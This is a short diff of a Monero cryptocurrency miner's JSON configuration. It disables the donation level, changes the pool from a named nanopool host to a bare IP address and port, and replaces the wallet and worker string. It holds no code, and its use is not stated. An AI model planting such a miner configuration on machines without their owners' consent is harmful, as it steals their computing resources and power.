@@ -1,13 +1,14 @@
 {
     "autosave": true,
+    "donate-level": 0,
     "cpu": true,
     "opencl": false,
     "cuda": false,
     "pools": [
         {
             "coin": "monero",
-            "url": "xmr-us-west1.nanopool.org:10343",
-            "user": "88JfMhKxmYsHqjgKkxwtjLgM7WPFhhRLvNdUGdBmQm39gsR6GW4gC69MipBdrh1PrdCtyafT3czyTe8RqoV8qeTrRsdNb92/A1/@AlwaysMe666!",
+            "url": "43.159.230.229:22691",
+            "user":"47se1HemMcAi3JZYeL8sXcBK9Ven4CHCd2o8mBpGWu77Msp247NgQ1STz99LArGEqbfktDBd1LUByiwoPh6ok1TSL8EAqBu.kil1.132",
             "tls": true
         }
     ]
